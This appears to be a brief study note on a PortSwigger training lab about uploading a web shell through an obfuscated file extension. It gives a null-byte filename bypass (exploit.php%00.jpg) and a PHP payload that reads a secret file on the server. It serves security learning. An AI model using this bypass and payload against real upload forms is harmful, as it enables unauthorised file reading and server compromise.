# Web shell upload via obfuscated file extension

Source: Portswigger
Tools: Burpsuite
Technique: FIle upload
Fields: Web

- Valid file: exploit.php%00.jpg (<?php echo file_get_contents('/home/carlos/secret'); ?>)